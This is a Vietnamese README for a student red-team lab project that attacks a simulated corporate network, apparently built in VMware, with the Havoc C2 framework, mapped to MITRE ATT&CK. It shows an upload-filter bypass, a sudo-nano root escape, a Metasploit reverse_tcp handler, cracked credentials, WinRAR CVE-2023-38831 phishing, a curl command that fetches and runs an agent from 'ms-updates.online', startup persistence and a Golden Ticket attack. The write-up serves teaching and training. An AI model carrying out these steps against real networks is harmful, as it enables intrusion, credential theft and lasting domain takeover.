# **Project ethical hacking**
# **Topic: tấn công mạng**
## **1. Thông tin về project**
Xây dụng mô hình và kịch bản tấn công hệ thống mạng sử dụng mô hình C2 havoc. Mô tả các kỹ thuật tấn công theo MITRE ATT@CK.
- Xây dựng mô hình chung cho hệ thống và xây dựng hoàn chỉnh các thành phần trong mạng như AD, Web, Client...
- Xây dựng mô hình C2, phân tích cụ thể các thành phần sử dụng trong C2.
- Xây dựng các kịch bản tấn công và phân tích các kỹ thuật sử dụng trong đó.

Hệ thống lab được build bằng VMware workstation pro.

## **2. Phân tích quá trình tấn công**
### **2.1 Kịch bản tấn công**
Mô hình bao gồm hệ thống Active Directory (AD), máy chủ Web (Web Server), và máy trạm Client (Windows 10). Hệ thống này mô phỏng một mạng doanh nghiệp điển hình.

AD: `phongbat.com`

Web: 'home.phongbat.com'

![](/Images/picture1.png)

Hệ thống nội bộ gồm 4 máy:
- `RootDC (Active Directory)`: Window Server 2019
- `User1 (WS1)`: Window 10
- `User2 (WS2)`: Window 10
- `Web (Web01)`: Ubuntu, đóng vai trò là WebServer giao tiếp với External Network

- Máy Attacker sử dụng `Kali Linux` dùng để xâm nhập vào hệ thống nội bộ ở trên.

Để tạo backdoor ta sử dụng `Havoc Framework`, lý do là Havoc Framework được chọn do tính năng mạnh mẽ, khả năng tùy chỉnh, và ít bị phát hiện bởi các hệ thống EDR/AV hiện nay.

Giới thiệu về `Havoc Framework`: một framework mã nguồn mở cho phép cài đặt và vận hành C2 server một cách dễ dàng, tích hợp nhiều tính năng giúp cho việc quản lí, duy trì trong hệ thống mạng đã khai thác, được sử dụng như một giải pháp thay thế cho `Cobalt Strike` và `Brute Ratel` (post-exploitation C2 framework). C2 framework cung cấp cho các threat actor khả năng thả beacon trên các mạng bị xâm chiếm để vận chuyển các payload độc hại. Trong những năm qua, `Cobalt Strike` và `Brute Ratel` đã trở thành công cụ phổ biến để các threat actor cung cấp payload độc hại cho những nạn nhân được nhắm tới. Điều này đã khiến các nhà phát triển và tổ chức C2 sử dụng `Cobalt Strike` và `Brute Ratel` phải cảnh giác hơn với phần mềm độc hại tiềm ẩn bên trong repository của họ. Với `Havoc`, các threat actor được cung cấp một lựa chọn mới trong việc nhắm mục tiêu và khai thác hệ thống mạng.

Về hệ thống C2 Server, gồm 3 thành phần chính:
- `Havoc Server`: Máy chủ cốt lõi của framework, dùng để khởi động listener, tương tác với các agent và xử lí các command do client yêu cầu.
- `Havoc Client`: Giao diện chính của framework, giúp cho các thành viên redteam liên lạc, tương tác với các máy bị xâm chiếm.
- `Havoc Agent`: payload được khởi chạy bởi máy tính mục tiêu, nhận lệnh và thực thi lệnh do server yêu cầu.

![](/Images/picture2.png)

Attacker có thể xâm nhập vào hệ thống thông qua 2 cách tiếp cận: exploit từ Web01 đi vào, tải và thực thi file agent, sau đó gửi malware phishing cho WS01, WS02, từ đó máy WS01 hoặc WS02 này sẽ tải agent và thực thi để thêm vào C2 Server, duy trì sự hiện diện trong hệ thống.

### **2.2 Phân tích cụ thể**
#### **2.2.1. Reconnaissance (T1595.003 - Active Scanning).**
Truy cập vào trang chủ chính `home.phongbat.com' ta chỉ thấy được các giao diện thông thường, kiểm tra vài lỗ hổng trong OWASP nhưng không có gì bất thường.

<p align="center">
    <img src="/Images/Picture3.png" width="49%" />
    <img src="/Images/Picture3-1.png" width="49%"  />
</p>

Ta sử dụng  công cụ gobuster tiến hành scandir xem có thư mục nào ẩn không ta tìm được một vài directory ẩn: `/robots.txt`,`/admin`.

![](/Images/Picture4.png)

Thử kiểm tra robots.txt ta tìm được một trang web cho phép upload ảnh online.

<p align="center">
    <img src="/Images/Picture4-1.png" width="49%" />
    <img src="/Images/Picture4-2.png" width="49%" />
</p>

Tuy nhiên,Trang upload chỉ cho phép .jpg. Bypass bằng cách tải lên shell.php.jpg chúng ta có thể chiếm quyền Web Server.


<p align="center">
    <img src="/Images/Picture5.png" width="49%" />
    <img src="/Images/Picture6.png" width="49%" />
</p>


![](/Images/Picture7.png)

![](/Images/Picture8.png)

#### **2.2.1. Initial Access .**
*Leo thang đặc quyền:

Vì chúng ta có quyền thấp nên cần phải nâng quyền lên `root` để có thể tiếp tục xâm nhập vào hệ thống nội bộ. 

Trong quá trình reconnaissance máy web, ta thử tìm kiếm các tệp, folder có từ khóa như user, password, domain... bằng lệnh `"grep -i 'password' /var/www/config"` thì thấy một file `config` chứa thông tin của user khác ở đường dẫn `/var/www/config`.
Ta dùng `ssh` để chuyển sang user này xem tìm kiếm được thông tin gì không.

![](/Images/Picture9.png)

User này được cấu hình chạy nano với sudo vì vậy ta dễ dàng nano để mở terminal (CTRL+R → CTRL+X → reset → sh) với quyền root, truy cập thư mục `/root`, ta tìm được credential của ip `12.3.3.10`

![](/Images/Picture10.png)
![](/Images/Picture10-3.png)
    <img src="/Images/Picture10-1.png"  />
    <img src="/Images/Picture10-2.png" />

Ta thử đăng nhập qua ssh sử dụng credential của ip `12.3.3.10`.

![](/Images/Picture11.png)

Chúng ta đã chiếm được thêm máy `WS01`

![](/Images/Picture11-2.png)

*Tìm kiếm thông tin:

Để xác định được hệ thống gồm bao nhiêu máy, ta sẽ tiến hành scan mạng nội bộ. Nhưng do vấn đề phát hiện và ghi log của máy, không sử dụng nmap mà ta sẽ tạo một file bash script có tên là check.sh và ping mạng `12.3.3.0/24`.

![](/Images/Picture12.png)

Ta tìm được 3 ip sau: `12.3.3.2`, `12.3.3.10` và `12.3.3.99` => hệ thống gồm 4 máy bao gồm web.

#### **2.2.3. Lateral Movement (T1021.001, T1570, T1534)**
*Cắm agent vào client1:
Tiếp theo ta sẽ sử dụng Havoc Framework để cắm agent vào máy `clien1` dễ dàng truy cập và duy trì sự hiện diện. Ở đây chúng ta sẽ sử dụng listener `admin` với HTTP và cổng 12345.

![](/Images/Picture13.png)

Chúng ta sẽ tạo một agent tên là teams.exe và gửi nó qua cho máy darlene bằng cách host một server có domain ms-updates.online chứa file này, sau đó kích hoạt để HavocClient hiển thị các thông tin của máy này, bao gồm cả shell, thư mục, đường dẫn, ...

![](/Images/Picture13-1.png)
![](/Images/Picture13-2.png)
<p align="center">
    <img src="/Images/Picture13-3.png" width="49%" />
    <img src="/Images/Picture13-4.png" width="49%" />
</p>

Vậy là ta đã thành công cắm C2 Server vào máy `client1`. Ta cần phải thêm file `teams.exe` này vào startup của máy để khi máy được khởi động, HavocCilent sẽ tự động kết nối. Chúng ta sẽ cd vào đường dẫn sau và tải file agent về, khi đó mục startup của máy sẽ có tiến trình agent này, khi máy khởi động thì tiến trình này sẽ tự động kích hoạt. Path: `C:\Users\clent1\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`.

![](/Images/Picture14.png)

Do không tìm thấy thông tin gì ở user này nên ta cần tìm kiếm thêm thông tin ở những user khác trong `WS01`

Việc đầu tiên cần làm là kiểm tra máy có mở port 3389 hay không. Và sau khi sử dụng lệnh shell `netstat -aon`, kết quả là máy có mở.

![](/Images/Picture15.png)

*Dump credentials:

Tiếp theo dump credentials của máy `WS01`, mục đích của việc này là để kiếm xem có các thông tin quan trọng mà các user này để ở đâu đó trong máy không. Tại bước này, ta sẽ sử dụng `Metasploit` để tạo payload có tên là `updates-ms.exe` và lấy được `Meterpreter` của máy `WS01`.

Tiếp theo chạy msfconsole để tạo listener.
```
Msf6> use exploit/multi/handler
Msf6> set payload windows/meterpreter/reverse_tcp
Msf6> set LHOST 172.16.17.20
Msf6> set LPORT 1234
Msf6> exploit
```
![](/Images/Picture16-1.png)

Sau đó, vận chuyển payload `updates-ms.exe` vừa tạo thông qua shell của HavocClient.

![](/Images/Picture16.png)

Sau khi cùng các tool của Meterperter ta tìm được các NTLM sau:

![](/Images/Picture16-2.png)

Sử dụng công cụ hash decryptor online, ta tìm được các account như sau:
```
admin:Matkhaucu@	
vantruong:P@ssword@
dangtrung:WinClient123
```

RDP từng user ta tìm được list email của các nhân viên trong document của một user khác trong `WS01`.

![](/Images/Picture17.png)

Phishing:

Vì tìm được các list email của nhân viên, ta sẽ tiến hành sử dụng kĩ thuật phishing, gửi malware cho các user mà ta thu thập được.

Để có thể phishing thì ta cần chuẩn bị một file malware. Ở đây chúng tôi sẽ sử dụng lỗi của winrar cho phép kẻ tấn công thực thi mã từ xa, với định danh CVE-2023-38831. Sử dụng tool tạo malware winrar được lấy từ (https://github.com/b1tg/CVE-2023-38831-winrar-exploit). Khởi tạo xong file và đặt tên là Ke_Hoach_Du_Lich, ta tiến hành gửi file rar này cho các user thông qua mail.

Script: ``` curl ms-updates.online/updates.exe -o updates.exe & updates.exe ```  

![](/Images/Picture18.png)
![](/Images/Picture18-1.png)	

Giả sử user trong 'WS02' đã tải về. Khi user này mở ra và bấm vào file, script sẽ được chạy, tải file agent có tên `updates.exe` về máy và tự khởi chạy.

<p align="center">
    <img src="/Images/Picture19.png" width="49%" />
    <img src="/Images/Picture19-1.png" width="49%" />
</p>

![](/Images/Picture19-2.png)

Vậy ta đã chiếm được `WS02`.

![](/Images/Picture20-1.png)

Kiểm tra ip của máy, ta biết được ip là `12.3.3.99`. Vậy máy còn lại có ip `12.3.3.2` chính là AD.

![](/Images/Picture20.png)
	

#### **2.2.4. Command and Control (T1071.001, T1570) và Exfiltration (T1041 - Exfiltration Over C2 Channel)**

Bên trong user `truongvantrung` ta tìm được cerdential của máy AD:

![](/Images/Picture21.png)

Vậy ta đã thu thập đủ thông tin của máy AD:
- IP: `12.3.3.2`
- Username: `phongbat`
- Password: `Matkhaumoi@`

Ta thử sử dụng credential này bằng rdp.

![](/Images/Picture22.png)

Tạo Backdoor Vĩnh Viễn Bằng Golden Ticket Attack vì:
- Vé Kerberos giả không bao giờ hết hạn, trừ khi krbtgt bị reset hai lần liên tiếp.
- Có thể giả mạo bất kỳ tài khoản nào, kể cả tài khoản quản trị cấp cao.
- Không thể bị phát hiện dễ dàng nếu không có giám sát chặt chẽ hoặc công cụ bảo mật mạnh.
- Tồn tại ngay cả khi tài khoản gốc bị xóa hoặc mật khẩu bị đổi.

Sau khi thu thập đủ thông tin và xâm nhập vào hệ thống, mục tiêu tiếp theo của chúng ta là duy trì quyền truy cập lâu dài mà không bị phát hiện. Một trong những kỹ thuật mạnh mẽ nhất để làm điều này trong môi trường Active Directory (AD) chính là Golden Ticket Attack. Đây là một trong những cuộc tấn công nguy hiểm nhất nhắm vào cơ chế xác thực Kerberos, cho phép kẻ tấn công tạo vé truy cập hợp lệ với quyền tối thượng, thậm chí ngay cả khi tài khoản bị vô hiệu hóa hoặc mật khẩu bị thay đổi.

Để thực hiện cuộc tấn công này, chúng ta cần thu thập hai yếu tố quan trọng từ Domain Controller (DC):

- NTLM hash của tài khoản krbtgt – Đây là tài khoản chịu trách nhiệm phát hành vé (ticket) Kerberos. Nếu chúng ta có hash của tài khoản này, chúng ta có thể tự tạo vé hợp lệ.
- Domain SID – Là định danh duy nhất của domain, cần thiết để xác thực vé.

Bằng cách sử dụng công cụ như Mimikatz, chúng ta có thể dễ dàng trích xuất NTLM hash của tài khoản krbtgt và SID của domain.

<p align="center"> <img src="/Images/Picture23.png" width="49%" /> <img src="/Images/Picture23-2.png" width="49%" /> </p>

Sau khi thu thập được các thông tin cần thiết, ta giả mạo vé Kerberos bằng Golden Ticket bằng công cụ ticketer.py của Impacket. Một lợi thế của ticketer.py là vé giả được ghi vào tệp .ccache thay vì .kirbi ;vì vậy ta không phải chuyển đổi nó. 

<p align="center">
    <img src="/Images/Picture24.png" width="49%" />
    <img src="/Images/Picture24-1.png" width="49%" />
</p>

Sau khi tạo vé thành công, chúng ta cần đặt biến môi trường để sử dụng vé này. Bây giờ, chúng ta có thể sử dụng các công cụ như:

- psexec.py – Thực thi lệnh từ xa trên máy mục tiêu.
- smbexec.py – Tạo shell thông qua SMB.
- wmiexec.py – Thực thi lệnh thông qua Windows Management Instrumentation (WMI).

Chỉ với một câu lệnh, chúng ta có thể chiếm toàn quyền kiểm soát Domain Controller:

![](/Images/Picture25.png)

Vậy ta đã xâm chiếm được toàn bộ hệ thống nội bộ.

![](/Images/Picture25-1.png)

## **3. Tổng kết**
Bảng MITRE ATT&CK:

|Tên kĩ thuật|ID|Phương thức|
|---|---|---|
|Reconnaissance|T1595.003|Active Scanning – Wordlist Scanning|
|Initial Access|T1659|Content Injection|
||T1078|Valid Account|
|Lateral Movement|T1021.001|Remote Service – Remote Desktop Protocol|
||T1534|Internal Spearphishing|
||T1570|Lateral Tools Transfer|
|Command and Control|T1659|Content Injection|
|Exfiltration|T1041|Exfiltration Over C2 Channel|

Tài liệu tham khảo:

[1] https://github.com/Ashifcoder/exposelab

[2] https://attack.mitre.org/matrices/enterprise/

[3] https://github.com/HavocFramework/Havoc

